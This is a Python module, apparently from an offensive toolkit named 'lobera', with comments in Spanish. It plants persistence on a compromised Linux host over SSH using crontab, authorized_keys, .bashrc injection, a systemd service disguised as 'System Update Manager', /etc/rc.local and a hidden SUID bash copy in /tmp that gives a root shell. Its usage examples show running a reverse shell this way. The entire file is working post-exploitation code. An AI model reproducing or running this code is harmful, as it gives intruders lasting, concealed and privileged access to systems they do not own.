# scripts/ssh/post/persistence.py
"""
Persistencia remota vía SSH (Linux/Unix).

Métodos disponibles:
  - crontab      — entrada en crontab del usuario (o root)
  - authorized   — añade clave pública a ~/.ssh/authorized_keys
  - bashrc       — inyecta comando en ~/.bashrc / ~/.bash_profile
  - systemd      — crea un servicio systemd de usuario o sistema
  - rc-local     — añade comando a /etc/rc.local
  - suid         — copia /bin/bash con bit SUID (requiere root)

Uso:
  python lobera.py ssh -t 10.10.10.5 --script=persistence -u USER -p PASS --method crontab --exec "/tmp/shell.sh" --trigger "*/5 * * * *"
  python lobera.py ssh -t 10.10.10.5 --script=persistence -u USER -p PASS --method authorized --local-file ~/.ssh/id_rsa.pub
  python lobera.py ssh -t 10.10.10.5 --script=persistence -u USER -p PASS --method systemd --exec "/tmp/revshell" --persist-name myservice
  python lobera.py ssh -t 10.10.10.5 --script=persistence -u USER -p PASS --method suid
"""

from core.output import console
from core import session_db


# ── Helper SSH ─────────────────────────────────────────────────────────────────

def _ssh_connect(target, user, password, port=22, key_file=None):
    """Devuelve cliente Paramiko autenticado."""
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    kwargs = dict(hostname=target, port=port, username=user, timeout=10)
    if key_file:
        kwargs["key_filename"] = key_file
    else:
        kwargs["password"] = password
    client.connect(**kwargs)
    return client


def _exec(client, cmd):
    """Ejecuta comando remoto; devuelve (stdout, stderr, exit_code)."""
    stdin, stdout, stderr = client.exec_command(cmd, timeout=15)
    out = stdout.read().decode(errors="replace").strip()
    err = stderr.read().decode(errors="replace").strip()
    rc  = stdout.channel.recv_exit_status()
    return out, err, rc


# ── Métodos de persistencia ────────────────────────────────────────────────────

def _crontab(client, payload, trigger):
    """Añade entrada al crontab del usuario actual."""
    console.print(f"  [bold]Método:[/bold] Crontab → {trigger}")

    # Leer crontab actual sin pisar nada
    out, _, _ = _exec(client, "crontab -l 2>/dev/null || true")
    marker = f"# lobera-persist"

    if marker in out:
        console.print(f"  [yellow]! Entrada ya existe en crontab[/yellow]")
        return True

    new_entry = f"\n{marker}\n{trigger} {payload}\n"
    escaped   = new_entry.replace("'", "'\\''")
    cmd = f"(crontab -l 2>/dev/null; printf '{escaped}') | crontab -"
    _, err, rc = _exec(client, cmd)

    if rc == 0:
        console.print(f"  [green]✓ Entrada crontab añadida[/green]")
        console.print(f"  [dim]{trigger} {payload}[/dim]")
        return True
    console.print(f"  [red]✗ Error: {err}[/red]")
    return False


def _authorized_keys(client, pub_key_content):
    """Añade clave pública a ~/.ssh/authorized_keys."""
    console.print(f"  [bold]Método:[/bold] authorized_keys")

    pub_key = pub_key_content.strip().replace("'", "'\\''")
    cmds = [
        "mkdir -p ~/.ssh && chmod 700 ~/.ssh",
        f"grep -qF '{pub_key}' ~/.ssh/authorized_keys 2>/dev/null || echo '{pub_key}' >> ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
    ]
    for cmd in cmds:
        _, err, rc = _exec(client, cmd)
        if rc != 0:
            console.print(f"  [red]✗ Error: {err}[/red]")
            return False

    console.print(f"  [green]✓ Clave pública añadida a authorized_keys[/green]")
    return True


def _bashrc(client, payload, name):
    """Inyecta comando en ~/.bashrc y ~/.bash_profile."""
    console.print(f"  [bold]Método:[/bold] .bashrc / .bash_profile → {name}")

    marker  = f"# {name}"
    escaped = payload.replace("'", "'\\''")

    for rc_file in ["~/.bashrc", "~/.bash_profile"]:
        out, _, _ = _exec(client, f"cat {rc_file} 2>/dev/null || true")
        if marker in out:
            console.print(f"  [yellow]! Ya presente en {rc_file}[/yellow]")
            continue
        cmd = f"printf '\\n{marker}\\n{escaped}\\n' >> {rc_file}"
        _, err, rc = _exec(client, cmd)
        if rc != 0:
            console.print(f"  [red]✗ Error en {rc_file}: {err}[/red]")
            return False
        console.print(f"  [green]✓ Inyectado en {rc_file}[/green]")

    return True


def _systemd(client, payload, name, system_wide=False):
    """Crea un servicio systemd (usuario o sistema)."""
    console.print(f"  [bold]Método:[/bold] Systemd {'sistema' if system_wide else 'usuario'} → {name}")

    unit = f"""[Unit]
Description=System Update Manager
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=10

[Install]
WantedBy={'multi-user.target' if system_wide else 'default.target'}
"""
    if system_wide:
        unit_path = f"/etc/systemd/system/{name}.service"
        enable_cmd = f"systemctl daemon-reload && systemctl enable {name} && systemctl start {name}"
    else:
        unit_path = f"~/.config/systemd/user/{name}.service"
        enable_cmd = f"systemctl --user daemon-reload && systemctl --user enable {name} && systemctl --user start {name}"

    escaped_unit = unit.replace("'", "'\\''").replace("\n", "\\n")

    cmds = [
        f"mkdir -p $(dirname {unit_path})",
        f"printf '{escaped_unit}' > {unit_path}",
        enable_cmd,
    ]

    for cmd in cmds:
        out, err, rc = _exec(client, cmd)
        if rc != 0:
            # Algunos sistemas no tienen loginctl; ignorar ese error concreto
            if "Failed to connect" in err and "--user" in cmd:
                console.print(f"  [yellow]! systemd --user no disponible, prueba sin --system-wide[/yellow]")
                return False
            console.print(f"  [red]✗ Error: {err or out}[/red]")
            return False

    console.print(f"  [green]✓ Servicio systemd creado: {name}[/green]")
    console.print(f"  [dim]{unit_path}[/dim]")
    return True


def _rc_local(client, payload, name):
    """Añade comando a /etc/rc.local (requiere root)."""
    console.print(f"  [bold]Método:[/bold] /etc/rc.local → {name}")

    marker  = f"# {name}"
    escaped = payload.replace("'", "'\\''")

    # Crear /etc/rc.local si no existe
    create_cmd = (
        "[ -f /etc/rc.local ] || "
        "printf '#!/bin/sh -e\\nexit 0\\n' > /etc/rc.local && "
        "chmod +x /etc/rc.local"
    )
    _exec(client, create_cmd)

    out, _, _ = _exec(client, "cat /etc/rc.local 2>/dev/null || true")
    if marker in out:
        console.print(f"  [yellow]! Ya presente en /etc/rc.local[/yellow]")
        return True

    # Insertar antes del 'exit 0' final
    cmd = (
        f"sed -i 's|^exit 0|{marker}\\n{escaped}\\nexit 0|' /etc/rc.local 2>/dev/null || "
        f"printf '\\n{marker}\\n{escaped}\\n' >> /etc/rc.local"
    )
    _, err, rc = _exec(client, cmd)
    if rc == 0:
        console.print(f"  [green]✓ Comando añadido a /etc/rc.local[/green]")
        return True
    console.print(f"  [red]✗ Error: {err}[/red]")
    return False


def _suid_bash(client):
    """Copia /bin/bash con bit SUID — permite escalar a root sin contraseña."""
    console.print(f"  [bold]Método:[/bold] SUID /bin/bash (requiere root)")

    cmds = [
        "cp /bin/bash /tmp/.lobera-bash",
        "chmod +s /tmp/.lobera-bash",
        "ls -la /tmp/.lobera-bash",
    ]
    for cmd in cmds:
        out, err, rc = _exec(client, cmd)
        if rc != 0:
            console.print(f"  [red]✗ Error: {err}[/red]")
            return False

    console.print(f"  [green]✓ SUID bash instalado en /tmp/.lobera-bash[/green]")
    console.print(f"  [dim]Ejecuta: /tmp/.lobera-bash -p   para obtener shell root[/dim]")
    return True


# ── Script principal ───────────────────────────────────────────────────────────

class Script:
    NAME        = "persistence"
    DESCRIPTION = "Persistencia remota Linux vía SSH: crontab, authorized_keys, bashrc, systemd, rc.local, SUID"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target     = str(self.target.ip)
        user       = getattr(args, "user",         None) or (self.creds.username if self.creds else None)
        password   = getattr(args, "password",     "") or (self.creds.password if self.creds else "")
        port       = int(getattr(args, "port",     None) or 22)
        key_file   = getattr(args, "local_file",   None)   # reutilizamos --local-file para clave privada/pública
        method     = getattr(args, "method",       "crontab") or "crontab"
        payload    = getattr(args, "exec",         None)
        name       = getattr(args, "persist_name", "sys-update")
        trigger    = getattr(args, "trigger",      "*/5 * * * *")  # cron schedule
        system_wide= getattr(args, "full",         False)          # --full → systemd system-wide

        if not user:
            console.print("[red]Falta -u USER[/red]")
            return

        console.print(f"  [bold]Persistencia SSH[/bold] → {target}  método: {method}")

        try:
            client = _ssh_connect(target, user, password, port=port,
                                  key_file=key_file if method != "authorized" else None)
        except Exception as e:
            console.print(f"  [red]✗ No se pudo conectar por SSH: {e}[/red]")
            return

        success = False

        if method == "crontab":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); client.close(); return
            success = _crontab(client, payload, trigger)

        elif method == "authorized":
            # --local-file = ruta a la clave pública local, o --exec = contenido directo
            if key_file:
                try:
                    pub_key_content = open(key_file).read()
                except Exception as e:
                    console.print(f"[red]No se pudo leer {key_file}: {e}[/red]"); client.close(); return
            elif payload:
                pub_key_content = payload
            else:
                console.print("[red]Falta --local-file <pub.key> o --exec <contenido clave>[/red]")
                client.close(); return
            success = _authorized_keys(client, pub_key_content)

        elif method == "bashrc":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); client.close(); return
            success = _bashrc(client, payload, name)

        elif method == "systemd":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD (ruta al binario)[/red]"); client.close(); return
            success = _systemd(client, payload, name, system_wide=system_wide)

        elif method == "rc-local":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); client.close(); return
            success = _rc_local(client, payload, name)

        elif method == "suid":
            success = _suid_bash(client)

        else:
            console.print(f"  [yellow]Métodos disponibles:[/yellow] crontab | authorized | bashrc | systemd | rc-local | suid")
            client.close(); return

        client.close()

        if success:
            session_db.save_finding(
                category="persistence",
                data={
                    "target":  target,
                    "proto":   "ssh",
                    "method":  method,
                    "name":    name,
                    "payload": payload,
                }
            )
            console.print(f"\n  [bold green]✓ Persistencia establecida[/bold green]")
        else:
            console.print(f"\n  [bold red]✗ No se pudo establecer persistencia[/bold red]")
